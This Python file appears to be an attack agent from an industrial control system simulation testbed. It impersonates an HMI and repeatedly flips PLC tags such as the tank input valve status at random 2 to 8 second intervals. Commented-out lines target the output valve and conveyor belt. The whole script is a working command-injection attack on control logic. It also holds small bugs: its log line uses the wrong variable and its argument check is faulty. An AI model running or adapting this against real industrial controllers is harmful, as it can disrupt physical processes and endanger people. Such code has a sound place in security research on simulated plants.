import logging
import os
import random
import sys
from datetime import datetime
from time import sleep

from ics_sim.Device import HMI
from Configs import TAG, Controllers
import Configs


class CommandInjectionAgent(HMI):
    def __init__(self, name , period , destination):
        super().__init__(name, TAG.TAG_LIST, Controllers.PLCs, period)
        self.destination= destination

    def _before_start(self):
        self._set_clear_scr(False)
        self.time = datetime.now().timestamp()
        self.period = 0
    def _logic(self):

        if datetime.now().timestamp() > self.time +  self.period :
            value =int( self._receive(self.destination))
            if int(value) == 1:
                value = 0
            elif int(value) ==0:
                value = 1

            self._send(self.destination, value)
            self.report( 'on time {} ({}) Signal {} changed to {}'.format( datetime.now(), datetime.now().timestamp(), destinations, value))
            self.period = random.randint(2, 8)
            self.time = datetime.now().timestamp()






if __name__ == '__main__':
    period = 0
    destinations = ''
    if len(sys.argv) > 0:
        period = int(sys.argv[1])

    attacker_list = []
    attacker_list.append(CommandInjectionAgent('AgentInputValve', 1, Configs.TAG.TAG_TANK_INPUT_VALVE_STATUS))
    #attacker_list.append(CommandInjectionAgent('AgentOutputValve', 1, Configs.TAG.TAG_TANK_OUTPUT_VALVE_STATUS))
    #attacker_list.append(CommandInjectionAgent('AgentConveyorBelt', 1, Configs.TAG.TAG_CONVEYOR_BELT_ENGINE_STATUS))

    for attacker in attacker_list:
        attacker.start()

    sleep(period)

    for attacker in attacker_list:
        attacker.stop()



